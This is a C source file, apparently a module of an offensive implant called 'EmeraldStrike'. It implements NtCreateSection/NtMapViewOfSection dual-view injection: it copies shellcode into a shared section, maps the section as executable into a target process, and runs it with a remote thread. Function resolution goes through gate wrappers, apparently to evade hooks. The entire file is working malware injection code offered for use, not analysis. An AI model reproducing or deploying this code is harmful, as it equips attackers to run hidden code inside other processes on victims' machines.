// EmeraldStrike - NtCreateSection dual-view injection technique
#include "evasion/injection.h"
#include "common.h"
#include "config.h"

#if INJECTION_TECHNIQUE == INJECT_SECTION

HANDLE inject_section(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step) {
    if (!inst->Win32.NtCreateSection || !inst->Win32.NtMapViewOfSection ||
        !inst->Win32.NtUnmapViewOfSection) {
        DBG(inst, "[INJECT] Nt funcs not resolved");
        if (step) *step = 20;
        return NULL;
    }

    LARGE_INTEGER section_size = {};
    section_size.QuadPart = sc_len;

    HANDLE hSection = NULL;
    DBG(inst, "[INJECT] NtCreateSection");
    if (step) *step = 21;
    NTSTATUS status = inst->Win32.NtCreateSection(
        &hSection, SECTION_ALL_ACCESS, NULL, &section_size,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0 || !hSection) {
        DBG(inst, "[INJECT] NtCreateSection FAILED");
        return NULL;
    }

    PVOID local_view = NULL;
    SIZE_T view_size = 0;
    DBG(inst, "[INJECT] NtMapViewOfSection local");
    if (step) *step = 22;
    status = inst->Win32.NtMapViewOfSection(
        hSection, (HANDLE)(LONG_PTR)-1, &local_view, 0, sc_len, NULL,
        &view_size, 2, 0, PAGE_READWRITE);
    if (status != 0 || !local_view) {
        DBG(inst, "[INJECT] NtMapViewOfSection local FAILED");
        gate_CloseHandle(inst, hSection);
        return NULL;
    }

    es_memcpy(local_view, shellcode, sc_len);

    PVOID remote_view = NULL;
    SIZE_T remote_view_size = 0;
    DBG(inst, "[INJECT] NtMapViewOfSection remote");
    if (step) *step = 23;
    status = inst->Win32.NtMapViewOfSection(
        hSection, hProcess, &remote_view, 0, sc_len, NULL,
        &remote_view_size, 2, 0, PAGE_EXECUTE_READ);

    inst->Win32.NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, local_view);
    gate_CloseHandle(inst, hSection);

    if (status != 0 || !remote_view) {
        DBG(inst, "[INJECT] NtMapViewOfSection remote FAILED");
        return NULL;
    }

    DBG(inst, "[INJECT] CreateRemoteThread");
    if (step) *step = 24;
    return gate_CreateRemoteThread(inst,
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_view, NULL, 0, NULL);
}

#endif // INJECT_SECTION
